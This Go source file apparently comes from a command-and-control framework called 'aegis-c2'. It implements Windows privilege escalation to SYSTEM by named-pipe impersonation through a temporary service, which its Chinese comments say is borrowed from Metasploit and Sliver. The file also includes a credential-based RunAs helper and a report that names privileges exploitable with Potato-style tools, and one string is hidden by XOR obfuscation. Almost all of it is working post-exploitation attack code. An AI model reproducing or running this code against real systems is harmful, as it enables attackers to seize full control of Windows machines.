//go:build windows && amd64

package priv

import (
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/aegis-c2/aegis/shared"
	"golang.org/x/sys/windows"
)

const (
	PIPE_ACCESS_DUPLEX            = 0x00000003
	PIPE_TYPE_MESSAGE             = 0x00000004
	PIPE_READMODE_MESSAGE         = 0x00000002
	PIPE_WAIT                     = 0x00000000
	PIPE_UNLIMITED_INSTANCES      = 255
	SECURITY_SQOS_PRESENT         = 0x00100000
	SECURITY_IDENTIFICATION       = 0x00000001
	SECURITY_IMPERSONATION        = 0x00000002
	DUPLICATE_SAME_ACCESS         = 0x00000002
	TOKEN_ALL_ACCESS              = 0x000F01FF
	SecurityImpersonation         = 2
	TokenPrimary                  = 1
	SERVICE_WIN32_OWN_PROCESS     = 0x00000010
	SC_MANAGER_ALL_ACCESS         = 0x000F003F
	SERVICE_ALL_ACCESS            = 0x000F01FF
	SERVICE_DEMAND_START          = 0x00000003
	SERVICE_ERROR_IGNORE          = 0x00000000
)

var (
	procCreateNamedPipe    = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe   = kernel32.NewProc("ConnectNamedPipe")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
	procCreateService      = advapi32.NewProc("CreateServiceW")
	procDeleteService      = advapi32.NewProc("DeleteService")
	procImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")
	procDuplicateTokenEx   = advapi32.NewProc("DuplicateTokenEx")
	procSetThreadToken     = advapi32.NewProc("SetThreadToken")
	procRevertToSelf       = advapi32.NewProc("RevertToSelf")
)

// GetSys 使用命名管道模拟技术提权到 SYSTEM。
// 借鉴 Metasploit/Sliver 的 getsys 实现：
// 1. 创建命名管道
// 2. 创建 Windows 服务（以 SYSTEM 运行）连接管道
// 3. 模拟管道客户端获取 SYSTEM Token
func GetSys() error {
	pipeName := fmt.Sprintf(`\\.\pipe\%s`, shared.GenID("aegis"))

	// 1. 创建命名管道
	pipeNameUTF16, _ := syscall.UTF16PtrFromString(pipeName)
	hPipe, _, err := procCreateNamedPipe.Call(
		uintptr(unsafe.Pointer(pipeNameUTF16)),
		PIPE_ACCESS_DUPLEX|SECURITY_SQOS_PRESENT|SECURITY_IDENTIFICATION,
		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		2048,
		2048,
		0,
		0,
	)
	if hPipe == 0 || hPipe == ^uintptr(0) {
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer procCloseHandle.Call(hPipe)

	// 2. 打开 SCM
	scm, err := windows.OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	// 3. 创建临时服务（cmd /c 连接管道）
	svcName := shared.GenID("svc")
	svcNameUTF16, _ := syscall.UTF16PtrFromString(svcName)
	displayNameUTF16, _ := syscall.UTF16PtrFromString(svcName)
	binPathUTF16, _ := syscall.UTF16PtrFromString(fmt.Sprintf(`cmd.exe /c "echo a > %s"`, pipeName))

	hSvc, _, err := procCreateService.Call(
		uintptr(scm),
		uintptr(unsafe.Pointer(svcNameUTF16)),
		uintptr(unsafe.Pointer(displayNameUTF16)),
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,
		uintptr(unsafe.Pointer(binPathUTF16)),
		0, 0, 0, 0, 0,
	)
	if hSvc == 0 {
		return fmt.Errorf("CreateService: %w", err)
	}
	defer func() {
		procDeleteService.Call(hSvc)
		windows.CloseServiceHandle(windows.Handle(hSvc))
	}()

	// 4. 启动服务
	windows.StartService(windows.Handle(hSvc), 0, nil)

	// 5. 等待管道连接
	time.Sleep(2 * time.Second)

	// 6. 连接管道
	procConnectNamedPipe.Call(hPipe, 0)

	// 7. 模拟管道客户端
	ret, _, err := procImpersonateNamedPipeClient.Call(hPipe)
	if ret == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", err)
	}

	// 8. 复制 Token（当前线程已被模拟，获取其 Token）
	var hThreadToken windows.Token
	hThread := windows.CurrentThread()
	if err := windows.OpenThreadToken(hThread, TOKEN_ALL_ACCESS, false, &hThreadToken); err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}

	var hNewToken windows.Handle
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(hThreadToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&hNewToken)),
	)
	if ret == 0 {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}

	// 9. 设置为当前线程 Token
	ret, _, err = procSetThreadToken.Call(0, uintptr(hNewToken))
	// SetThreadToken increments the token ref count; safe to close our handle
	windows.CloseHandle(hNewToken)
	if ret == 0 {
		return fmt.Errorf("SetThreadToken: %w", err)
	}

	// 10. 验证
	currentUser := whoami()
	if !strings.EqualFold(currentUser, "SYSTEM") && !strings.EqualFold(currentUser, "NT AUTHORITY\\SYSTEM") {
		return fmt.Errorf("getsys: token changed but not SYSTEM (got: %s)", currentUser)
	}

	return nil
}

func whoami() string {
	var name [256]uint16
	var size uint32 = uint32(len(name))
	if windows.GetUserNameEx(windows.NameSamCompatible, &name[0], &size) == nil {
		return syscall.UTF16ToString(name[:size])
	}
	return "unknown"
}

// RunAs 使用指定凭据创建新进程。
func RunAs(domain, username, password, command string) error {
	domainW, _ := syscall.UTF16PtrFromString(domain)
	userW, _ := syscall.UTF16PtrFromString(username)
	passW, _ := syscall.UTF16PtrFromString(password)
	cmdW, _ := syscall.UTF16PtrFromString(command)
	return createProcessWithLogon(domainW, userW, passW, cmdW)
}

func createProcessWithLogon(domain, user, pass, cmd *uint16) error {
	var startupInfo windows.StartupInfo
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	var procInfo windows.ProcessInformation

	proc := advapi32.NewProc("CreateProcessWithLogonW")

	ret, _, err := proc.Call(
		uintptr(unsafe.Pointer(user)),
		uintptr(unsafe.Pointer(domain)),
		uintptr(unsafe.Pointer(pass)),
		1, // LOGON_WITH_PROFILE
		uintptr(unsafe.Pointer(cmd)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&startupInfo)),
		uintptr(unsafe.Pointer(&procInfo)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessWithLogonW: %w", err)
	}

	windows.CloseHandle(procInfo.Process)
	windows.CloseHandle(procInfo.Thread)
	return nil
}

// GetSysReport 返回 getsys 尝试结果。
func GetSysReport() string {
	currentUser := whoami()
	il := IntegrityLevel()
	privs := CheckPrivs()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Current User: %s\n", currentUser))
	sb.WriteString(fmt.Sprintf("Integrity:    %s\n", il))

	hasSeImpersonate := privs["SeImpersonatePrivilege"]
	hasSeAssignPrimary := privs["SeAssignPrimaryTokenPrivilege"]
	hasSeDebug := privs["SeDebugPrivilege"]

	sb.WriteString(fmt.Sprintf("\nGetSys Feasibility:\n"))
	if currentUser == "SYSTEM" {
		sb.WriteString("  Already SYSTEM.\n")
		return sb.String()
	}
	if hasSeImpersonate {
		sb.WriteString("  [OK] SeImpersonatePrivilege — can use JuicyPotato/PrintSpoofer/GodPotato\n")
	}
	if hasSeAssignPrimary {
		sb.WriteString("  [OK] SeAssignPrimaryTokenPrivilege — can use token manipulation\n")
	}
	if hasSeDebug {
		sb.WriteString(fmt.Sprintf("  [OK] %s \xe2\x80\x94 can inject into SYSTEM processes\n", xp([]byte{0x2a, 0x3f, 0x12, 0x3f, 0x19, 0x3e, 0x13, 0x7a, 0x2d, 0x3b, 0x1e, 0x3b, 0x3f, 0x27, 0x1e, 0x2e, 0x13, 0x7a, 0x1f, 0x3b, 0x2b, 0x3f, 0x32, 0x1e}))) // SeDebugPrivilege
	}
	if !hasSeImpersonate && !hasSeAssignPrimary && !hasSeDebug {
		sb.WriteString("  [FAIL] No exploitable privileges found.\n")
	}

	return sb.String()
}
